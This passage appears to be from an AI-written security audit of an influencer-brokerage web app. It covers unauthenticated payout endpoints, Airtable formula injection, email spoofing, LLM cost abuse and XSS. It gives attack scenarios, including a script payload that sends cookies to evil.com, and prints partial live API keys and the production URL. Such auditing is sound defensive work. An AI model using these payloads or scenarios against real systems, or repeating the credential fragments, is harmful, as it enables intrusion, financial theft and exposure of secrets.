All six Brief 14 endpoints are publicly accessible on Render's URL with zero authentication. The most severe case is `POST /api/deals/:dealId/release-20-percent`: an unauthenticated POST with a valid `dealId` that passes day-30 eligibility check will call `release20Percent(dealId)` in `payment_handler.js:322`, which calls `stripe.transfers.create()` — firing a real Stripe transfer to the creator's connected account. The read endpoints expose deal-level financial state (payout amounts, compliance spec, transfer IDs) for any deal the attacker can identify.

**Concrete attack scenario:**
Attacker discovers the Render URL from a public source (Render deployments on free tier are public). Airtable record IDs follow the pattern `rec[A-Za-z0-9]{14}`. The attacker need not enumerate all possible IDs — a 404 response vs a 200 response reveals whether an ID is valid. Attacker scripts `GET /api/deals/{randId}/compliance-status` in a loop: 404 = not found, 200 = valid deal. Once valid IDs are found, attacker reads `compliance-spec` (full campaign terms, contact email, payout amounts). For deals where day-30 eligibility is already met, attacker POSTs to `/api/deals/{dealId}/release-20-percent` — triggering a Stripe transfer to the creator's account before the operator intended. Brokerage loses the 20% compliance hold.

**Suggested remediation path:**
Brief 14.2 must implement auth middleware before all six endpoints. Minimum viable: a static bearer token (`Authorization: Bearer <OPERATOR_SECRET>`) checked on all POST and GET API endpoints. The `OPERATOR_SECRET` is stored in Render environment variables. The dashboard's `app.js` sends the header with every API call. This eliminates the unauthenticated access vector without requiring a full session system. The `POST /api/deals/:dealId/release-20-percent` endpoint is the most urgent — it triggers a financial action.

**Estimated remediation effort:** medium

---

### Finding B.2.B — Airtable Formula Injection

**Severity:** HIGH
**Category:** Injection
**Status:** Confirmed gap

**Evidence (file/line citations required):**

**Primary site (attacker-controlled via inbound email):**
- `src/skills/negotiation_handler.js:334-335`:
  ```javascript
  const senderLower = senderEmail.toLowerCase().trim();
  const brands = await fetchRecords(brandsTable, `LOWER({contact_email}) = '${senderLower}'`);
  ```
  `senderLower` traces to: `senderEmail` parameter → `processInboundEmail({ senderEmail })` → `server.js:503`: `const senderEmail = emailMatch ? emailMatch[1].trim() : fromField.trim()` → `fromField = fields.from` → `fields` from multer parsing of the raw inbound email body — **attacker-controlled**.

**Secondary sites (attacker-controlled via inbound email):**
- `src/server.js:532`: `fetchRecords(influencersTable, \`{email} = '${senderEmail}'\`)` — `senderEmail` same as above.
- `src/server.js:533`: `fetchRecords(brandsTable, \`{contact_email} = '${senderEmail}'\`)` — same.
- `src/server.js:612`: `fetchRecords(influencersTable, \`{email} = '${email}'\`)` in bounce handler — `email` from `evt.email` in SendGrid payload; attacker-controllable if signature verification is soft-fail (EC-3).
- `src/server.js:620`: `fetchRecords(brandsTable, \`{contact_email} = '${email}'\`)` — same.

**Internal-only sites (not attacker-controlled; record IDs sourced from Airtable):**
- `src/server.js:76`: `fetchRecords(dealsTable, \`stripe_invoice_id = '${invoiceId}'\`)` — `invoiceId` from Stripe SDK response — trusted.
- `src/server.js:153`: `fetchRecords(dealsTable, \`RECORD_ID() = '${dealId}'\`)` — `dealId` from `paymentIntent.metadata.deal_id` (Stripe-verified). Semi-trusted but metadata is operator-set.
- `src/server.js:318`: PandaDoc `SEARCH('${docId}', pandadoc_doc_id)` — `docId` from PandaDoc webhook; signature-gated but soft-fail mode applies.
- `src/server.js:653,669,686,746,751,790,902,954`: All use `dealId` or `token` from `req.params`/`req.body` without sanitization — these come from API callers. Until auth is implemented (B.2.A), these are attacker-reachable.
- `src/skills/negotiation_handler.js:197,208,212`: `fetchRecords` with `draftId`, `brandId`, `creatorId` — all sourced from Airtable records (not external input). Not immediately exploitable.

**Description:**
Five Airtable formula interpolation sites accept values that originate from attacker-controlled inbound email headers (the `From:` field). An apostrophe (`'`) in the sender email address breaks the formula string, causing an Airtable API error which is silently caught (`fetchRecords` returns `[]` on error). This results in DoS on the reply-matching and sender-identification pipelines. More complex formula injection (e.g., `LOWER({contact_email}) = '' OR 1=1 OR ''`) could potentially cause formula parse errors or unexpected record matches, though Airtable's formula language is not SQL and true exfiltration is not possible.

**Concrete attack scenario:**
Attacker sends email from `victim's-brand@evil.com` (matching a real brand's domain pattern) with a crafted From header: `From: test'@evil.com`. At `server.js:532`, the formula becomes `{email} = 'test'@evil.com'` — Airtable formula parse error, returns `[]`. All subsequent lookup failures cascade: the inbound email is treated as "no match" (orphan), logged, and silently discarded. If the attacker sends 100 such emails per hour, the inbound classification pipeline is effectively DoS'd without any rate-limiting or auth protection.

**Suggested remediation path:**
Create `sanitizeAirtableFormulaValue(str)` in `airtable.js`: replace all single quotes with `\'` (or remove them). Apply at every `fetchRecords` call site where the interpolated value is not a known-safe Airtable record ID. This is a small, targeted fix. The 5 attacker-controlled sites are the immediate priority; the 8+ internal sites are lower priority but should be sanitized for consistency.

**Estimated remediation effort:** small

---

### Finding B.2.C — Stripe Metadata Trust at Lock Time

**Severity:** MEDIUM
**Category:** Auth
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/server.js:127-128`:
  ```javascript
  const paymentIntent = stripeEvent.data.object;
  const dealId = paymentIntent.metadata?.deal_id;
  ```
  `deal_id` is trusted directly from the Stripe event's metadata object.
- `src/server.js:153-158`: `fetchRecords(dealsTable, \`RECORD_ID() = '${dealId}'\`)` — fetches the deal by metadata ID; no further validation of payment intent amount vs deal amount.
- `src/server.js:168-175`: Validates deal status (`preLockStates` check) — this is a status guard, not an amount guard.
- `src/server.js:199-202`: Reads `workingSpec.payout_terms` from the Deal's stored `compliance_spec` — but does **not** compare the PaymentIntent's `amount` to the spec's expected total.
- No check: `paymentIntent.amount` vs `workingSpec.payout_terms.total_creator_payout_amount`.
- No check: `paymentIntent.receipt_email` / `paymentIntent.customer` vs the Deal's brand contact email.

**Description:**
The lock pipeline trusts `metadata.deal_id` from the PaymentIntent to identify the deal, but does not verify that the PaymentIntent's `amount` matches the deal's expected payment. If a PaymentIntent with `deal_id = <real_deal_id>` arrives with an incorrect amount (e.g., $1.00 instead of $10,000), the pipeline proceeds: the deal transitions to LOCKED, the compliance spec is frozen, and contracts are generated — for a payment that does not represent the agreed deal value.

**Concrete attack scenario:**
This attack requires the attacker to create a Stripe PaymentIntent against the brokerage's Stripe account — which requires either (a) access to a public checkout surface that allows `metadata` to be set, or (b) a Stripe API key. If the brokerage has no public checkout surface (all PaymentIntents are created server-side by the operator), this attack surface is effectively zero. However: Stripe's hosted invoices (which this codebase uses via `stripe.invoices.sendInvoice()`) allow a brand to pay any amount. If a brand disputes the invoice amount in Stripe and partial-pays, the `payment_intent.succeeded` event fires with the partial amount, `metadata.deal_id` is present, and the lock pipeline triggers on a partial payment. The deal locks for less than the agreed rate.

**Suggested remediation path:**
Add an amount verification step in `handleStripePaymentSucceeded` after fetching the Deal: compare `paymentIntent.amount` (in cents) to `workingSpec.payout_terms.total_creator_payout_amount * 100`. If the amounts don't match within a small tolerance (e.g., ±$1 for rounding), log a HIGH alert and transition to `BREACH_FLAGGED` rather than `LOCKED`. This prevents partial-payment lock. Also verify `paymentIntent.customer` email against the brand's contact email as a secondary sanity check.

**Estimated remediation effort:** small

---

### Finding B.2.D — PandaDoc Document Ownership

**Severity:** MEDIUM
**Category:** Webhook hardening
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/server.js:318`: `const deals = await fetchRecords(dealsTable, \`SEARCH('${docId}', pandadoc_doc_id) > 0\`);` — Deal lookup is by `docId` from the webhook payload, matched against `pandadoc_doc_id` stored in Airtable.
- `src/server.js:330-334`: Additional check: `deal.pandadoc_brand_document_id === docId` or `deal.pandadoc_creator_document_id === docId` — only deals where the document ID was written by `contract_generator.js` will match.
- No check: PandaDoc account/workspace ownership. The handler does not verify that `docId` belongs to the brokerage's PandaDoc workspace.
- PandaDoc document IDs are UUIDs (not sequential integers) — not trivially enumerable.

**Description:**
The webhook handler identifies deals by matching the incoming `docId` against `pandadoc_doc_id` stored in Airtable. This is an indirect ownership check — only documents created by the brokerage's PandaDoc integration would have their IDs stored in Airtable. An external attacker cannot create a document in the brokerage's PandaDoc workspace. The realistic attack surface is: (1) a soft-fail mode bypass (EC-2 gap) allows fake webhook injection — but then any `docId` not in the brokerage's Airtable would return `deals.length === 0` and be silently ignored; (2) a former brokerage user (or PandaDoc workspace member) with access to real document IDs could craft a webhook payload. PandaDoc UUIDs are 32-character hex strings — not enumerable.

**Concrete attack scenario:**
Attacker somehow obtains a real PandaDoc document UUID (e.g., from a leaked email containing a PandaDoc signing link). In soft-fail mode (EC-2 not fixed), attacker POSTs to `/webhooks/pandadoc` with `data.id = <real_uuid>` and `data.status = "document.completed"`. If that UUID exists in the brokerage's Airtable `pandadoc_doc_id` field, the handler processes a fake signature event. This is a chained attack requiring EC-2 to be unresolved. Severity drops to LOW if `PANDADOC_VERIFY_STRICT=true` is set.

**Suggested remediation path:**
Fix EC-2 first — `PANDADOC_VERIFY_STRICT=true` eliminates the fake webhook injection vector entirely. As defense-in-depth, the handler could verify the PandaDoc API directly on `document.completed` events: fetch the document from the PandaDoc API and confirm its `status` before writing the ComplianceEvent.

**Estimated remediation effort:** trivial (EC-2 fix eliminates primary vector) to small (API verification)

---

### Finding B.2.E — Roster Portal Token Entropy and Replay

**Severity:** LOW
**Category:** Auth
**Status:** Partially implemented

**Evidence (file/line citations required):**
- `src/skills/negotiation_handler.js:565`: `const token = crypto.randomBytes(16).toString('hex');` — 16 bytes = 128 bits of entropy. Expressed as a 32-character hex string. **Entropy is adequate.**
- `src/skills/negotiation_handler.js:566-567`: `const expires = new Date(); expires.setDate(expires.getDate() + 14);` — 14-day TTL. Stored as ISO string in `roster_token_expires`.
- `src/server.js:659-661`: Expiry check: `if (brand.roster_token_expires && new Date() > new Date(brand.roster_token_expires)) return res.status(410).send("This roster link has expired.");`
- `src/server.js:775-776`: Token invalidation on use: `await updateRecord(brandsTable, brand.id, { roster_token: null, roster_token_expires: null, status: 'INTERESTED' });` — **token cleared after selection submission** (single-use on POST `/api/roster/select`).
- `src/server.js:794-797`: Token also cleared on decline: `roster_token: null, roster_token_expires: null`.
- No single-use enforcement on GET `/roster` — the token can be used multiple times to view the roster page until it expires or until `POST /api/roster/select` is called.
- No IP or user-agent binding.

**Description:**
Token entropy (128 bits) is adequate for brute-force resistance. 14-day TTL is reasonable. Single-use enforcement exists at the POST stage (token nulled after selection). Gap: the `GET /roster` endpoint does not invalidate the token on each view — a brand can forward the link and multiple parties can view the roster with the same token until expiry or selection. View count is incremented (line 664-666), providing operator visibility, but no access restriction per view.

**Concrete attack scenario:**
Brand employee receives roster URL and forwards it to a competitor who views creator rates, subscriber counts, and pricing before the token is used or expires. For this specific business (influencer brokerage), exposing creator rates to a competitor is a business risk, not a financial loss. Not CRITICAL.

**Suggested remediation path:**
For higher security, invalidate the token after first view (or add a max-view-count check). For current volume, the 14-day TTL and post-selection invalidation are likely adequate. The view count tracking (`roster_view_count`) provides operator audit capability. Document that the token is view-multiple, select-once by design (if that's intended).

**Estimated remediation effort:** trivial

---

### Finding B.2.F — Outreach Reply Spoofing via Sender Email

**Severity:** HIGH
**Category:** Input validation
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/utils/sendgrid_signature.js:21-64` — SendGrid ECDSA verifies that the webhook payload came from SendGrid's servers. This verifies the **transport** (SendGrid sent it), not the **email authenticity** (that the `From:` header is legitimate).
- `src/server.js:479`: `const fromField = fields.from || '';` — `from` field is taken from the parsed multipart body.
- `src/server.js:502-503`: `const emailMatch = fromField.match(/<([^>]+)>/); const senderEmail = emailMatch ? emailMatch[1].trim() : fromField.trim();`
- `src/server.js:532-533` — Sender identity is established solely from `senderEmail` (derived from `From:` header). No SPF/DKIM/DMARC check.
- SendGrid Inbound Parse payloads may include `SPF`, `DKIM` fields depending on configuration — these are **not read** anywhere in the handler.
- `src/skills/negotiation_handler.js:241-281` — `classifyNegotiation()` processes the email body. If sender is classified as `green_yes`, `generateRosterLink` is called and the roster URL is sent to the brand's **real** contact email (not the spoofed one — sent to `record.contact_email` at line 529).

**Description:**
The inbound email handler trusts the `From:` header unconditionally for sender identification. SMTP's `From:` header is trivially spoofable — any SMTP server can send email with any `From:` header. SendGrid's ECDSA signature (when enforced) proves that SendGrid processed the email, not that the `From:` address is authentic. If an attacker spoofs a brand's `From:` address and sends a `green_yes`-classifying body, the system classifies the reply as green, writes correlation data to the matched OutreachDraft, and updates the brand record status. The roster link, however, is sent to the **real** contact email in the Airtable record (not the `From:` address), limiting the immediate financial damage.

**Concrete attack scenario:**
Attacker spoofs `From: "Brand Contact" <cmo@realbrand.com>` and sends "Yes, I'd love to see the roster" to the brokerage's Inbound Parse address. If Tier 1a/1b matching succeeds (attacker includes a valid `In-Reply-To` header referencing a known sent draft's Message-ID), the system classifies the reply as `green_yes`, writes `reply_classification: 'green_yes'` to the OutreachDraft, and the operator dashboard shows the brand as having positively responded. The operator may act on this false signal — calling the brand, sending follow-ups, marking the deal as progressed. The roster link goes to the real CMO's email (which they didn't request), creating a confusing customer experience and potentially revealing timing of the broker's outreach to the brand.

**Suggested remediation path:**
Parse SendGrid Inbound Parse payload for SPF/DKIM fields (SendGrid includes `SPF: pass/fail` and `DKIM` results in the multipart payload). Require SPF=pass for any classification action that changes deal state. For Tier 2 matching (most-recent-sender heuristic), require SPF=pass before trusting the `From:` address for brand lookup. Log SPF/DKIM results in the activity log for audit. This is a medium effort change that significantly raises the spoofing bar.

**Estimated remediation effort:** small to medium

---

### Finding B.2.G — LLM Cost Abuse Vectors

**Severity:** HIGH
**Category:** DoS
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/server.js:977-989` — `POST /api/outreach/batch`: no auth, no rate limit, no token budget check.
- `src/skills/outreach_orchestration.js:71-189` — `runOutreachBatchForBrand()`: fetches brand, runs match → score → for each top-N creator, calls `generateOutreachDraft()`. `topN` defaults to 20. No cost ceiling check.
- `src/skills/outreach_engine.js:366-371` — `chatCompletion()` call: `maxTokens` defaults to 4096 (from `llm.js:103`), `webSearch: { enabled: true, maxUses: 2 }` — each draft generation can trigger web searches.
- `src/utils/llm.js:102-104` — `resolvedMaxTokens = maxTokens || 4096`. No token budget enforcement.
- No per-brand, per-batch, or per-day Anthropic spend ceiling anywhere in codebase.
- `src/skills/negotiation_handler.js:274-280` — `classifyNegotiation()` calls `chatCompletion()` for every inbound email — no per-sender rate limit, no cost ceiling.

**Description:**
Two LLM cost exposure vectors exist. Vector 1: `POST /api/outreach/batch` is unauthenticated (Finding B.2.A) and unbounded. Each call triggers up to 20 LLM calls (one per creator), each with up to 4096 output tokens and 2 web searches. At Anthropic's current pricing for Claude Sonnet, 20 calls × ~4000 input + 4096 output tokens ≈ ~$2–4 per batch. 100 parallel batches = $200–400 per minute. Vector 2: `POST /webhooks/sendgrid/inbound` triggers an LLM call per email via `classifyNegotiation()`. An attacker sending 100 emails per minute would trigger 100 LLM classification calls per minute — ~$0.05–0.20 per minute at current pricing (lower than Vector 1, but sustained over hours).

**Concrete attack scenario:**
Attacker sends POST to `/api/outreach/batch` with 100 different valid `brandId` values (obtained by enumerating valid IDs via the unauthenticated `/api/deals` endpoint — see Finding ADDITIONAL-1) in a loop. Each request launches an async batch generating 20 outreach drafts. 100 batches × 20 LLM calls × $0.05/call (estimated) = $100 in Anthropic charges within 5 minutes. Operator receives no alert until the Anthropic billing dashboard is checked. Brokerage's Anthropic key may be rate-limited at the API level, but the damage accumulates.

**Suggested remediation path:**
(1) Auth on `/api/outreach/batch` (Brief 14.2 scope — resolves primary vector). (2) Add a maximum batch count per API call (e.g., reject if the brand has already had a batch run in the last 24 hours). (3) Add a per-day Anthropic spend ceiling: track cumulative token usage in Airtable or a simple counter, halt LLM calls if daily budget exceeded. (4) For inbound classification: add per-sender rate limiting (e.g., max 5 inbound classifications per sender email per hour). These are separate but complementary controls.

**Estimated remediation effort:** medium

---

### Finding B.2.H — `event_payload` XSS Forward-Looking

**Severity:** INFO
**Category:** Forward-looking
**Status:** Not applicable to current architecture

**Evidence (file/line citations required):**
- `src/server.js:349,293` — `event_payload` is stored as JSON string in ComplianceEvents: `event_payload: JSON.stringify({ pandadoc_document_id: docId, pandadoc_status: docStatus })`. Values are system-derived (not user-provided text).
- `src/skills/payment_handler.js:293,371` — `event_payload: JSON.stringify({ amount, transfer_id: transferId })` — system-derived.
- `dashboard/app.js` — search for `event_payload` rendering: file is 10KB; not searched yet (see below).
- No current HTML rendering of `event_payload` content found in `server.js` or skills.

**Description:**
`event_payload` is currently populated with system-derived JSON (document IDs, Stripe amounts, transfer IDs). There is no current HTML rendering surface — Brief 15 dashboards do not yet exist. The forward-looking risk: when Brief 15b/15c dashboards render ComplianceEvents for brands/creators, `event_payload` content must be treated as untrusted and escaped before insertion into HTML, regardless of `event_source = 'system_derived'`. Today's payload content is safe, but the field's schema allows any Long Text JSON — future briefs may add operator-supplied or brand-supplied notes that contain XSS payloads.

**Concrete attack scenario:**
Not applicable today — no rendering surface exists. Future risk: Brief 15b renders ComplianceEvents in a brand portal. An operator inadvertently stores `<script>alert(1)</script>` in `event_notes` (a related Long Text field). If the brand portal renders `event_notes` as innerHTML, XSS fires in the brand's browser.

**Suggested remediation path:**
Document in Brief 15b/15c briefing: all ComplianceEvent fields rendered in HTML must use `.textContent` or equivalent escaping (not `.innerHTML`). Use a templating engine with auto-escaping (e.g., Handlebars, Nunjucks). Treat `event_payload`, `event_notes`, `event_actor` as untrusted regardless of source. No current action needed.

**Estimated remediation effort:** n/a now; small to medium when Brief 15 dashboards are built

---

## Section 4 — Additional Findings (Section C)

### Finding ADDITIONAL-1 — `/api/deals` Exposes Full CRM Data Unauthenticated

**Severity:** HIGH
**Category:** Auth
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/server.js:807-881` — `GET /api/deals`: no auth middleware. Returns all deals, influencers, and brands in a unified array — including `agreed_rate`, `broker_fee`, `niche`, `influencer_name`, `brand_name`, `status`.
- `src/server.js:810-813` — Fetches all three tables simultaneously: `fetchRecords(dealsTable)`, `fetchRecords(influencersTable)`, `fetchRecords(brandsTable)`.
- Return shape (line 833-841) includes: deal ID, influencer ID, brand ID, agreed_rate, deliverables, quote_terms, status, escalation_flag.

**Description:**
The main dashboard data endpoint returns the entire CRM — every deal with financial terms, every influencer with status and identifiers, every brand with company name and deal state — to any unauthenticated HTTP client. This is the foundational data endpoint consumed by the operator dashboard (`dashboard/app.js`), but it has no auth gate. An attacker querying this endpoint gets a complete map of the brokerage's deal pipeline, including brand identities and deal amounts.

**Concrete attack scenario:**
Attacker fetches `GET https://influencer-brokerage-os.onrender.com/api/deals`. Response includes all Airtable record IDs for deals, brands, and influencers. Attacker now has valid `dealId` and `brandId` values for use against the Brief 14 endpoints (B.2.A) and the outreach batch endpoint (B.2.G). The full deal pipeline — brand names, deal amounts, influencer pairings — is exposed to any internet client.

**Suggested remediation path:**
Apply the same auth middleware designed in Brief 14.2 to `GET /api/deals`. This is the highest-traffic endpoint for the operator dashboard and must be protected before any auth-bypass risk is acceptable. Until auth lands, this endpoint is the primary reconnaissance tool for all other attacks.

**Estimated remediation effort:** trivial (once auth middleware is designed — same application as B.2.A)

---

### Finding ADDITIONAL-2 — CSRF on Financial-Action POST Endpoints

**Severity:** MEDIUM
**Category:** Auth
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- Search for `csrf|CSRF|xsrf|token.*header|Authorization.*header` across all `src/**/*.js`: zero matches.
- `src/server.js:884` — `POST /api/release_payout`: accepts JSON body, no CSRF token check, no `SameSite` cookie (no cookies at all).
- `src/server.js:1024` — `POST /api/deals/:dealId/release-20-percent`: same.
- `src/server.js:929` — `POST /api/generate_contracts`: same.
- Dashboard (`dashboard/app.js`) makes fetch() calls to these endpoints — confirmed SPA architecture. Cookies are not used for auth.

**Description:**
CSRF protection is partially structurally guaranteed: because the operator dashboard uses JavaScript `fetch()` (not HTML form submission), a cross-origin CSRF attack requires the malicious site to send a cross-origin request to the Render URL. Without CORS configuration, the browser **does** send the request (CORS only blocks reading the response, not sending the request). A CSRF attack against `POST /api/deals/:dealId/release-20-percent` would trigger a Stripe transfer if the endpoint is accessible.

However: since there is no cookie-based session (no auth at all yet), a CSRF attack requires no cookies to forge — the endpoint is already publicly accessible without any session. CSRF becomes a distinct concern only after auth is implemented. If auth uses cookies, CSRF protection is needed. If auth uses `Authorization: Bearer` token-in-header, CSRF is structurally impossible (the browser does not auto-include custom headers in CSRF attacks from cross-origin pages).

**Concrete attack scenario:**
After Brief 14.2 auth is implemented with cookies: attacker creates a page at `evil.com` that auto-submits a form to `https://influencer-brokerage-os.onrender.com/api/deals/recXXXXXXXXXXXX/release-20-percent`. If an authenticated operator visits `evil.com` while logged into the brokerage dashboard, the CSRF request fires with the operator's session cookie. Stripe transfer executes.

**Suggested remediation path:**
When implementing auth in Brief 14.2, choose Bearer token in header (not cookies) — this makes CSRF structurally impossible. If cookies are used, add `SameSite=Strict` and a CSRF token. Document this dependency: the CSRF posture depends entirely on the auth mechanism chosen in Brief 14.2.

**Estimated remediation effort:** trivial (design choice in Brief 14.2)

---

### Finding ADDITIONAL-3 — `express.json()` Body Size Limit is Default (100kb)

**Severity:** LOW
**Category:** DoS
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/server.js:646` — `app.use(express.json());` — no `limit` option specified. Express default is 100kb.
- `src/server.js:452` — SendGrid inbound: `express.raw({ type: '*/*', limit: '50mb' })` — explicitly set to 50MB for email attachments. This is appropriate for email payloads.
- No endpoint currently accepts a large JSON body by design (e.g., `compliance_spec` submissions are not currently an API endpoint — specs are written by the lock pipeline internally). Future endpoints may.

**Description:**
The 100kb Express default is appropriate for current endpoints (all POST bodies are small: `{ deal_id: "rec..." }`, `{ brandId: "rec..." }`). However, if Brief 15 introduces a compliance_spec submission endpoint, a 100kb limit may be too small or too large depending on spec size. The 50MB limit on the SendGrid inbound handler is disproportionately large — an attacker sending a 50MB email attachment body causes the server to buffer 50MB per request. With enough concurrent requests, this is a memory-exhaustion DoS.

**Concrete attack scenario:**
Attacker sends HTTP POST to `/webhooks/sendgrid/inbound` with a 50MB body and a valid (or soft-fail) signature. Server buffers 50MB × N concurrent requests. On Render free tier (512MB RAM), 10 concurrent 50MB requests would exhaust memory. The SendGrid inbound handler's signature verification occurs **after** the body is buffered (the raw body must be read before signature verification).

**Suggested remediation path:**
Reduce the SendGrid inbound body limit from 50MB to a reasonable maximum for email content, e.g., 5MB. Real inbound emails rarely exceed a few MB. Keeping the 50MB limit is unnecessary and creates a DoS surface. For `express.json()`, the 100kb default is fine for current routes — add explicit `limit: '10kb'` to document the intent.

**Estimated remediation effort:** trivial

---

### Finding ADDITIONAL-4 — Roster Portal XSS via Airtable Record Data

**Severity:** MEDIUM
**Category:** Injection
**Status:** Confirmed gap

**Evidence (file/line citations required):**
- `src/server.js:706-725` — Creator card HTML generation:
  ```javascript
  cardsHtml += `
      <div class="creator-card">
          ...
          <h2 class="creator-name">${inf.name || 'Creator'}</h2>
          ...
          <p><strong>Deliverable:</strong> ${terms.deliverable_type}</p>
          <p><strong>Timeline:</strong> ${terms.timeline}</p>
          <p><strong>Usage & Exclusivity:</strong> ${terms.usage_rights || 'Standard'} | ${terms.exclusivity_window || 'None'}</p>
          <div class="price">$${displayPrice.toLocaleString()}</div>
      </div>
  `;
  ```
- `src/server.js:731-735` — HTML template replacement:
  ```javascript
  html = html.replace(/{{BRAND_NAME}}/g, brand.company_name || 'your brand')
  ```
  `brand.company_name` is interpolated directly into HTML without escaping.
- `src/server.js:673,691` — `matchHint` is constructed with `influencers.length` (number — safe) and `parentLabel` (from `niches.js` — static data, safe).

**Description:**
The roster portal (`GET /roster`) generates HTML server-side by interpolating Airtable record fields directly into HTML template strings without escaping. Fields interpolated include: `inf.name`, `terms.deliverable_type`, `terms.timeline`, `terms.usage_rights`, `terms.exclusivity_window`, and `brand.company_name`. If any of these fields contain HTML special characters or JavaScript (`<script>...</script>`), the rendered roster page will execute that script in the brand contact's browser.

**Concrete attack scenario:**
An influencer record in Airtable has their `name` set to `<script>fetch('https://evil.com/steal?t='+document.cookie)</script>`. An operator creates a roster link and sends it to a brand contact. When the brand contact opens the roster URL, the XSS fires in their browser. Since the roster page doesn't carry session cookies for the operator dashboard, the immediate impact is limited — but it damages the brokerage's reputation and could steal any localStorage data on the domain.

**Suggested remediation path:**
HTML-escape all Airtable field values before interpolating into the roster HTML template. Implement an `htmlEscape(str)` helper that replaces `&`, `<`, `>`, `"`, `'` with HTML entities. Apply to: `inf.name`, `terms.deliverable_type`, `terms.timeline`, `terms.usage_rights`, `terms.exclusivity_window`, `brand.company_name`, `expiryDate`. Apply also to `brand.company_name` in the template replacement at line 731.

**Estimated remediation effort:** small

---

## Section 5 — Codebase Inventory

### Auth-Related Code

| Component | File | Description |
|---|---|---|
| Stripe HMAC | `src/utils/sendgrid_signature.js` | ECDSA via `@sendgrid/eventwebhook` SDK |
| PandaDoc HMAC | `src/utils/pandadoc_signature.js` | `crypto.timingSafeEqual` — correct |
| SendGrid ECDSA | `src/utils/sendgrid_signature.js` | Three-mode: soft-fail / log-only / strict |
| Roster token | `src/skills/negotiation_handler.js:564-577` | `crypto.randomBytes(16)`, 14-day TTL |
| API auth | — | **None** |

### Middleware Registration Order (server.js)

1. `express.static()` — line 42 (dashboard assets, before `express.json()`)
2. `POST /webhooks/stripe` — line 47 (raw body inline)
3. `POST /webhooks/pandadoc` — line 240 (raw body inline)
4. `POST /webhooks/sendgrid/inbound` — line 452 (raw body, 50MB limit)
5. `POST /webhooks/sendgrid/bounce` — line 563 (raw body)
6. `app.use(express.json())` — line 646 (all subsequent routes get parsed JSON)
7. All API routes (`/api/*`, `/roster`, etc.) — lines 648-1152 (**no auth middleware registered**)

### Security-Relevant Dependencies

| Package | Version | Notes |
|---|---|---|
| `stripe` | `^15.0.0` | Two major versions behind (current: ^17). May miss security patches. |
| `@sendgrid/eventwebhook` | `^8.0.0` | Used for ECDSA verification. Current. |
| `@anthropic-ai/sdk` | `^0.98.0` | High semver number — verify against npm current. |
| `express` | `^4.19.2` | Minor version behind 4.21.x. Not a known security concern. |
| `multer` | `^2.1.1` | Used for multipart parsing. |
| `helmet` | — | **Not installed** |
| `cors` | — | **Not installed** |
| `express-rate-limit` | — | **Not installed** |
| `zod` / `joi` | — | **Not installed** |

### LLM Call Sites

| File | Function | Model | Max Tokens | Tool-Use Enforced |
|---|---|---|---|---|
| `src/utils/llm.js` | `chatCompletion()` | `claude-sonnet-4-6` | 4096 (default) | Yes |
| `src/utils/llm.js` | `classifyAndExtract()` | `claude-sonnet-4-6` | 2048 | **No (dead code)** |
| `src/skills/negotiation_handler.js` | `classifyNegotiation()` | via `chatCompletion` | 4096 | Yes |
| `src/skills/outreach_engine.js` | `generateOutreachDraft()` | via `chatCompletion` | 4096 | Yes |

### Webhook Idempotency Coverage

| Webhook | Key Construction | findExistingEvent called |
|---|---|---|
| Stripe | Native Stripe event ID (`evt_xxx`) | ✅ Yes (line 58) |
| PandaDoc | SHA-256 of `docId|docStatus|dateModified` | ✅ Yes (line 297) |
| SendGrid inbound | SHA-256 of `from|timestamp|subject` | ✅ Yes (line 488) |
| SendGrid bounce | SHA-256 of `bounce|sg_message_id|email` | ✅ Yes (line 597) |

---

## Section 6 — Open Questions for Operator

### Q1 — IMMEDIATE ACTION REQUIRED: Live Production Credentials in Local `.env`

The `.env` file in the workspace (`c:\Users\Shadow\.gemini\antigravity\scratch\influencer-agency\.env`) contains live production credentials for **all critical services**: Stripe (`sk_live_51Rbiv1...`), SendGrid (`SG.TzCCkZnjTGiP9K6z...`), Anthropic (`sk-ant-api03-vgI...`), Airtable (`pat6nzDb8VER...`), PandaDoc, YouTube, Apify, and X/Twitter.

The file is correctly excluded from git (`.gitignore:2` confirms `.env` is listed; `git ls-files .env` returns empty). **However:** this is a development machine with live production keys. Actions needed:

1. **Verify** this machine is not synced via iCloud Drive, Dropbox, OneDrive, or any cloud backup service that would upload `.env` to cloud storage.
2. **Verify** no other person has access to this machine or this directory path.
3. **Confirm** these are the same keys in use on Render — if so, a machine compromise compromises the production Stripe account (`sk_live_` = full charge/transfer capability).
4. **Consider** using separate Stripe test keys (`sk_test_`) for local development to contain the blast radius of local machine compromise.

This is documented here rather than treated as a code finding because it is not a code gap — it is a local development security practice question. The implementing model is surfacing it per Section H directive: "If you find something so critical it seems like it needs immediate fixing, DOCUMENT IT in the report and surface in Section 6."

---

### Q2 — Render Environment Variables: Are `PANDADOC_VERIFY_STRICT=true` and `SENDGRID_VERIFY_STRICT=true` Set?

The codebase has two webhook handlers in soft-fail mode by default (PandaDoc: `server.js:247`, SendGrid: `sendgrid_signature.js:23`). These must be set to `true` in Render for signature enforcement to be active. The implementing model cannot verify Render's environment variable configuration from the codebase alone.

**Operator action:** Confirm in the Render dashboard that both `PANDADOC_VERIFY_STRICT=true` and `SENDGRID_VERIFY_STRICT=true` are set in the production environment variables. If they are not set, webhook signature enforcement is effectively disabled.

---

### Q3 — Does Any Public Stripe Checkout Surface Allow Client-Side Metadata?

Finding B.2.C's severity depends on whether a Stripe PaymentIntent can be created with arbitrary `metadata.deal_id` from the client side. The codebase creates Stripe invoices server-side via `payment_handler.js:createInvoices()` — these PaymentIntents' metadata is operator-controlled. However, if there is any Stripe Payment Link, hosted checkout, or client-side Stripe.js integration that allows `metadata` to be passed from the browser, the B.2.C attack vector becomes real.

**Operator action:** Confirm whether the brokerage has any public Stripe checkout surfaces (Payment Links, hosted invoices accessible via URL). If yes, verify those surfaces do not allow client-specified `metadata`.

---

### Q4 — Render Free Tier Log Retention

The implementing model found that `logger.js` and `errorHandler.js` write to local filesystem (`logs/activity_log.jsonl` and `logs/error_log.jsonl`). On Render's free tier, the filesystem is ephemeral and resets on each deploy or restart. This means all structured logs are lost on restart.

